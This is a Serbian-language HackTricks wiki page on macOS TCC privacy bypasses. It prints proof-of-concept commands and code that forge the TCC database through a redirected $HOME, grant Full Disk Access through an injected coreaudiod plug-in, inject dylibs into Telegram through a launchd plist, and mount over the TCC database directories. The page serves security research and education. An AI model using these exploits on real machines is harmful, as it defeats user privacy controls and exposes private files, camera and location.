# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## By functionality

### Write Bypass

Ovo nije bypass, već samo način na koji TCC funkcioniše: **Ne štiti od upisivanja**. Ako Terminal **nema pristup čitanju Desktop-a korisnika, i dalje može da upisuje u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
The **extended attribute `com.apple.macl`** se dodaje novom **file-u** kako bi **creators app** dobio pristup za čitanje.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC prompt-a** kako bi korisnik **prihvatio** zahtev, a da to ne primeti. PoC možete pronaći u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Napadač može **kreirati aplikacije sa bilo kojim nazivom** (npr. Finder, Google Chrome...) u **`Info.plist`** fajlu i naterati ih da zatraže pristup nekoj lokaciji zaštićenoj pomoću TCC-a. Korisnik će misliti da je legitimna aplikacija ta koja zahteva ovaj pristup.\
Pored toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i postaviti lažnu aplikaciju na njeno mesto**, tako da, kada korisnik klikne na lažnu aplikaciju (koja može koristiti istu ikonu), ona može pozvati legitimnu aplikaciju, zatražiti TCC dozvole i izvršiti malware, navodeći korisnika da poveruje da je legitimna aplikacija zatražila pristup.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano, pristup putem **SSH-a je imao "Full Disk Access"**. Da biste ovo onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste neće ukloniti te privilegije):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Podrazumevano, pristup putem SSH-a je imao "Full Disk Access". Da biste ovo onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste...](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere kako su neki **malware-i uspeli da zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Imajte na umu da vam je sada, da biste mogli da omogućite SSH, potreban **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se fajlovima kako bi **određenoj aplikaciji omogućio dozvole za njihovo čitanje.** Ovaj atribut se postavlja kada se fajl **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na fajl da bi ga otvorio pomoću **podrazumevane aplikacije**.

Zato bi korisnik mogao da **registruje zlonamernu aplikaciju** za rukovanje svim ekstenzijama i pozove Launch Services da **otvori** bilo koji fajl (tako će zlonamernom fajlu biti odobren pristup za čitanje).<sup>[[23]](#references)</sup>

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC servisom, koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** su imali ovaj entitlement i druge koji su to omogućavali.

Za više **informacija** o exploitu za **dobijanje iCloud tokena** pomoću ovog entitlement-a pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

Aplikacija sa **`kTCCServiceAppleEvents`** dozvolom moći će da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.<sup>[[2]](#references)</sup>

Više informacija o Apple Scripts potražite na:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako aplikacija ima **Automation dozvolu nad aplikacijom `iTerm`**, u ovom primeru **`Terminal`** ima pristup aplikaciji iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, koji nema FDA, može da pozove iTerm, koji ga ima, i koristi ga za izvršavanje radnji:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Preko Finder-a

Ili, ako App ima pristup preko Finder-a, može da pokrene skriptu kao što je ova:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ponašanje po aplikaciji

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

userland **tccd daemon** je koristio **`HOME`** **env** varijablu za pristup TCC users bazi podataka na lokaciji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovoj Stack Exchange objavi](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), i zato što se TCC daemon pokreće putem `launchd` unutar domena trenutnog korisnika, moguće je **kontrolisati sve environment varijable** koje mu se prosleđuju.<sup>[[19]](#references)</sup>\
Prema tome, **attacker bi mogao da podesi `$HOME` environment** varijablu u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da restartuje **TCC** daemon, a zatim **direktno izmeni TCC bazu podataka** i sebi dodeli **svaki dostupan TCC entitlement**, bez ikakvog prompta za krajnjeg korisnika.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Napomene

Notes je imao pristup lokacijama zaštićenim pomoću TCC-a, ali je novokreirana beleška bila **sačuvana na nezaštićenoj lokaciji**. Zbog toga je attacker mogao da zatraži od aplikacije Notes da kopira zaštićeni fajl u belešku, a zatim da pristupi dobijenim podacima sa nezaštićene lokacije:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binary `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imao je entitlement `com.apple.private.nullfs_allow`, koji mu je omogućavao da kreira **nullfs** mount, kao i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, koji mu je omogućavao pristup svakom fajlu.

Bilo je moguće dodati quarantine atribut direktorijumu "Library", pozvati **`com.apple.security.translocation`** XPC service, nakon čega bi Library bio mapiran na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde je svim dokumentima unutar direktorijuma Library moglo da se **pristupi**.

### CVE-2024-44131 - FileProvider symlink race

Aplikacije koje prepuštaju operacije nad fajlovima **privileged helper-u** (ovde **`fileproviderd`** / **`Files.app`**) kopiraju ili premeštaju stavke **u ime korisnika**, pa se kopiranje izvršava sa privilegijama helper-a, a ne pozivaoca.

Jamf Threat Labs je pokazao da validacija symlink-a koja se obavlja pre operacije može biti predmet **race** uslova: umesto postavljanja symlink-a na **poslednju** komponentu putanje (koja se proverava), attacker menja **posredni** direktorijum putanje **nakon što je kopiranje već počelo**. Privileged helper tada prati link koji kontroliše attacker i čita/piše lokacije zaštićene pomoću TCC-a **bez ikakvog prikazivanja prompt-a**.<sup>[[5]](#references)</sup>

Direktorijumi koji **nisu** zaštićeni nasumičnim UUID-om u svojoj putanji (na primer `~/Library/Mobile Documents/com~apple~CloudDocs`) najlakše su mete, jer attacker može da predvidi punu putanju potrebnu za race.

> [!TIP]
> Ovo je generički obrazac koji treba tražiti: **svaki privileged proces koji razrešava putanju više od jednom** (check-then-use ili situacija u kojoj `rename()`/`copyfile()` zasebno razrešavaju izvor i odredište) može biti predmet race-a tako što se direktorijum u sredini putanje zameni. Samo `O_NOFOLLOW_ANY`, `openat()` nad već otvorenim direktorijumom FD-a ili `realpath()` + ponovna validacija zaista zatvaraju ovaj vremenski prozor.

Više informacija nalazi se u [**tekstu Jamf Threat Labs-a**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` može biti build-ovan sa `SQLITE_ENABLE_SQLLOG`, što dodaje logging hook kojim upravljaju environment variables ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – za **svaku otvorenu bazu podataka**, **kopija fajla baze podataka** i log SQL iskaza upisuju se u `path` (direktorijum mora već da postoji).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – kreira **novu kopiju svaki put** kada se DB otvori/pripoji, umesto ponovne upotrebe postojeće.
- **`SQLITE_SQLLOG_CONDITIONAL`** – loguje konekciju samo ako pored glavne DB postoji fajl `<database>-sqllog`.

Ako možeš da inject-uješ ovu promenljivu u proces koji ima **FDA** i otvara SQLite baze podataka, on će bez problema **kopirati te zaštićene baze podataka** u direktorijum koji kontrolišeš. Pošto se naziv odredišnog fajla izvodi iz podataka koje kontroliše attacker, **symlink postavljen na odredištu** pretvara isti primitive u **arbitrary file write** sa privilegijama ciljnog procesa.

### **SQLITE_AUTO_TRACE**

Ako je environment variable **`SQLITE_AUTO_TRACE`** postavljen, biblioteka **`libsqlite3.dylib`** će početi da **loguje** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.<sup>[[22]](#references)</sup>

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup informacijama zaštićenim pomoću TCC-a.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### Pronalaženje upisa u fajlove pokretanih env-var promenljivama

Prethodna dva unosa su primeri iste generičke tehnike i vredi potražiti još takvih slučajeva: **framework-ovi učitani u TCC-privileged aplikacije često izlažu debug/logging environment promenljive koje primoravaju proces da kreira fajl na putanji koju kontroliše pozivalac**.

Workflow za njihovo pronalaženje:

1. Izaberite cilj sa FDA ili nekom drugom korisnom TCC dozvolom (`Music`, `TV`, `Terminal`, MDM agents...) i navedite framework-ove sa kojima se povezuje (`otool -L`, `vmmap`).
2. Pretražite te framework-ove za `getenv` stringove: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Postavite kandidat promenljive pomoću `launchctl setenv NAME /path/you/control`, pokrenite aplikaciju i pratite šta radi na filesystem-u pomoću `fs_usage -w -f filesys <pid>` ili `sudo fs_usage | grep <path>`.
4. Ako proces **kreira ili preimenuje** fajl u vašem direktorijumu, imate write primitive: usmerite odredište na symlink (ili izvedite race sa posrednim direktorijumom, kao kod CVE-2024-44131 iznad) da biste ga preusmerili na `~/Library/Application Support/com.apple.TCC/TCC.db`.

> [!TIP]
> Dve stvari ovo ograničavaju. Prvo, **`DYLD_*` promenljive se ignorišu za hardened-runtime binarne fajlove** osim ako aplikacija ne sadrži entitlement [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) ("Boolean vrednost koja označava da li na aplikaciju mogu uticati dynamic linker environment promenljive, koje možete koristiti za ubacivanje koda u proces aplikacije") — pogledajte i [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/). Drugo, Apple uklanja pojedinačne framework debug promenljive čim budu prijavljene, pa promenljiva koja je radila u jednom macOS izdanju često nestane u sledećem. Ako aplikacija tiho odbije pokretanje nakon što postavite neku promenljivu, smatrajte da je ta promenljiva već filtrirana.<sup>[[7]](#references)[[8]](#references)</sup>

Pogledajte [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) za ekvivalentni trik sa linker promenljivama.

### Apple Remote Desktop

Kao root mogli biste da omogućite ovaj servis, a **ARD agent bi imao full disk access**, što bi korisnik zatim mogao da zloupotrebi za kopiranje nove **TCC user database**.

## Preko **NFSHomeDirectory**

TCC koristi bazu podataka u korisnikovom HOME folderu za kontrolu pristupa resursima specifičnim za korisnika na putanji **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Zato, ako korisnik uspe da restartuje TCC sa $HOME env promenljivom koja pokazuje na **drugi folder**, mogao bi da kreira novu TCC bazu podataka u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.

> [!TIP]
> Imajte na umu da Apple koristi vrednost podešavanja sačuvanu u korisničkom profilu, u atributu **`NFSHomeDirectory`**, kao **vrednost za `$HOME`**, pa ako kompromitujete aplikaciju sa dozvolama za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete **weaponize** ovu opciju pomoću TCC bypass-a.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu korisnikovog **HOME** foldera.

1. Nabavite _csreq_ blob za ciljnu aplikaciju.
2. Postavite lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blob-om.
3. Exportujte korisnikov Directory Services unos pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmenite Directory Services unos da biste promenili korisnikov home directory.
5. Importujte izmenjeni Directory Services unos pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustavite korisnikov _tccd_ i rebootujte proces.

Drugi POC koristio je **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, čime je attacker mogao da navede **custom Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene korisnikovog home directory-ja pomoću **`dsexport`** i **`dsimport`** sa **`configd` code injection** metodom.

Za više informacija pogledajte [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).<sup>[[11]](#references)</sup>

## Preko process injection-a

Postoje različite tehnike za ubacivanje koda unutar procesa i zloupotrebu njegovih TCC privilegija:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešći process injection za bypass TCC-a je preko **plug-inova (load library)**.\
Plug-inovi su dodatni kod, obično u obliku biblioteka ili plist fajlova, koji će biti **učitani od strane glavne aplikacije** i izvršavaće se u njenom kontekstu. Zato, ako je glavna aplikacija imala pristup fajlovima ograničenim pomoću TCC-a (putem dodeljenih dozvola ili entitlement-a), **custom code će ga takođe imati**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala plug-inove sa ekstenzijom **`.daplug`** i **nije imala hardened** runtime.

Da bi se ovaj CVE weaponize-ovao, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodnog entitlement-a) kako bi bilo moguće **preuzeti korisnikovu TCC bazu podataka** i zaobići TCC.

Za više informacija pogledajte [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

Binarni fajl **`/usr/sbin/coreaudiod`** imao je entitlement-e `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao code injection**, a drugi mu je davao pristup za **upravljanje TCC-om**.

Ovaj binarni fajl je omogućavao učitavanje **third party plug-inova** iz foldera `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plug-in i zloupotrebiti TCC dozvole** pomoću ovog POC-a:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

System aplikacije koje otvaraju stream kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **ove plugins** u procesu, koji se nalaze u `/Library/CoreMediaIO/Plug-Ins/DAL` (nisu ograničeni SIP-om).

Jednostavno skladištenje biblioteke sa uobičajenim **constructor**-om na toj lokaciji omogućiće **inject code**.

Nekoliko Apple aplikacija bilo je ranjivo na ovo.

### Firefox

Firefox aplikacija je imala entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako ovo lako exploitovati, pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

Binarna datoteka `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imala je entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućavalo ubacivanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće zloupotrebiti ga za **dobijanje pristupa njegovim dozvolama**, na primer za snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Obratite pažnju na to da je za učitavanje library-ja pomoću env varijable napravljen **custom plist** za ubacivanje te library datoteke, a zatim je korišćen **`launchctl`** za njeno pokretanje:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Pomoću `open` poziva

Moguće je pozvati **`open`** čak i kada ste u sandbox-u

### Terminal Scripts

Prilično je uobičajeno dodeliti terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički upućene osobe. Takođe je moguće pozivati **`.terminal`** skripte pomoću njega.

**`.terminal`** skripte su plist datoteke poput ove, sa komandom koju treba izvršiti u ključu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacija bi mogla da upiše terminal script na lokaciju kao što je /tmp i pokrene ga naredbom kao što je:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montiranjem

### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija

**Bilo koji korisnik** (čak i korisnici bez privilegija) može da kreira i montira Time Machine snapshot i **pristupi svim datotekama** tog snapshot-a.\
**Jedina potrebna privilegija** jeste da aplikacija koja se koristi (kao što je `Terminal`) ima **Full Disk Access** (FDA) pristup (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje može se [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - Montiranje preko TCC file-a

Čak i ako je TCC DB file zaštićen, bilo je moguće **montirati preko direktorijuma** novi TCC.db file:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **ceo exploit** u [**originalnom tekstu**](https://theevilbit.github.io/posts/cve-2021-30808/).<sup>[[21]](#references)</sup>

### CVE-2024-40855

Kao što je objašnjeno u [originalnom tekstu](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebio `diskarbitrationd`.<sup>[[16]](#references)</sup>

Funkcija `DADiskMountWithArgumentsCommon` iz javnog `DiskArbitration` framework-a obavljala je bezbednosne provere. Međutim, moguće je zaobići je direktnim pozivanjem `diskarbitrationd` i na taj način koristiti elemente `../` u putanji i symlink-ove.

To je napadaču omogućilo proizvoljno mount-ovanje na bilo kojoj lokaciji, uključujući i preko TCC baze podataka, zbog entitlement-a `com.apple.private.security.storage-exempt.heritable` koji poseduje `diskarbitrationd`.

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo mount-ovanje na drugom mestu, zaobilazeći TCC zaštite.

### CVE-2022-22655 - Location Services

Location Services se **ne čuvaju** u TCC bazi podataka kao ostali servisi. Njima upravlja `locationd`, koji održava sopstvenu allow-listu u **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Svaki unos je označen klijentom (bundle ID ili putanja do izvršne datoteke) i sadrži polja kao što su `Authorized`, `BundleId`, `Executable` i `Registered`.<sup>[[4]](#references)</sup>

Sam fajl `clients.plist` zaštićen je pomoću Sandbox/TCC i ne može se izmeniti čak ni kao root — ali **direktorijum `/var/db/locationd/` nije bio zaštićen od mountovanja**. Zato je napadač koji radi kao root mogao da napravi disk image koji sadrži sopstveni `clients.plist` (sa svojim binary-jem označenim kao `Authorized`), mountuje ga preko tog direktorijuma i restartuje `locationd`, čime bi falsifikovana allow-lista stupila na snagu.<sup>[[3]](#references)</sup>

> [!TIP]
> Ovo je isti obrazac kao kod `hdiutil`/`mount` TCC bypass-a iznad: *fajl* je zaštićen, ali *direktorijum u kom se nalazi* nije, pa se zamenjuje ceo direktorijum umesto fajla.

## Pomoću startup aplikacija


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Pomoću grep-a

U više slučajeva fajlovi čuvaju osetljive informacije, kao što su email adrese, brojevi telefona, poruke... na nezaštićenim lokacijama (što se prema Apple-u smatra ranjivošću).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ovo više ne funkcioniše, ali [**ranije je funkcionisalo**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način pomoću [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Zaobilaženje macOS Transparency, Consent, and Control (TCC) Framework-a](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Slučajno i namerno zaobilaženje macOS TCC zaštite privatnosti korisnika](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - zaobilaženje TCC Location Services (originalni izveštaj)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Gde je na svetu Carmen Sandiego: Zloupotreba Location Services na macOS-u](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass krade podatke iz iCloud-a](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG env promenljive)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Allow DYLD environment variables entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [Zero-Day TCC bypass otkriven u XCSSET malware-u](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: „Ono što se dešava na vašem Mac-u ostaje na Apple-ovom iCloud-u?!“ - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
